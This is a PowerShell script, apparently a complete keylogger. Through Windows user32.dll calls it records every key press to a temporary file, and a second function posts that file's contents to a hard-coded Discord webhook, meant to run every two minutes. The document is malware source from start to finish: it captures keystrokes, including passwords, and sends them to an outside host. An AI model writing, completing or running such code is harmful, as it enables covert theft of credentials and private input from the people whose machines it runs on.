#requires -Version 2

function Start-KeyLogger($Path="$env:temp\keylogger.txt") {
    # Signatures for API Calls
    $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    # Load signatures and make members available
    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

    # Create output file
    $null = New-Item -Path $Path -ItemType File -Force

    try {
        Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

        # Create endless loop. When user presses CTRL+C, finally-block
        # executes and shows the collected key presses
        while ($true) {
            Start-Sleep -Milliseconds 40  # Sleep for 40 milliseconds (adjust as needed)

            # Scan all ASCII codes above 8
            for ($ascii = 9; $ascii -le 254; $ascii++) {
                # Get current key state
                $state = $API::GetAsyncKeyState($ascii)

                # Is key pressed?
                if ($state -eq -32767) {
                    $null = [console]::CapsLock

                    # Translate scan code to real code
                    $virtualKey = $API::MapVirtualKey($ascii, 3)

                    # Get keyboard state for virtual keys
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $API::GetKeyboardState($kbstate)

                    # Prepare a StringBuilder to receive input key
                    $mychar = New-Object -TypeName System.Text.StringBuilder

                    # Translate virtual key
                    $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                    if ($success) {
                        # Add key to logger file
                        [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    }
                }
            }
        }
    }
    catch {
        Write-Error "An error occurred: $_"
    }
}

function Send-OutputToDiscordWebhook($Path) {
    $webhookUrl = "https://discord.com/api/webhooks/1059819241957773412/68iCYTlEdChwAJ2fjqXgbwQQD6UDnRooW5iZBRPH9cnw3K76yDfhcq2jSVBxbEwu-q9E"
    $content = Get-Content -Path $Path -Raw

    $body = @{
        "content" = $content
    } | ConvertTo-Json

    $null = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
}

# Records all key presses until script is aborted by pressing CTRL+C
# Will then open the file with collected key codes
Start-KeyLogger

# Send the keylogger output to Discord webhook every 2 minutes
while ($true) {
    Start-Sleep -Seconds 120  # Sleep for 2 minutes
    Send-OutputToDiscordWebhook "$env:temp\keylogger.txt"
}
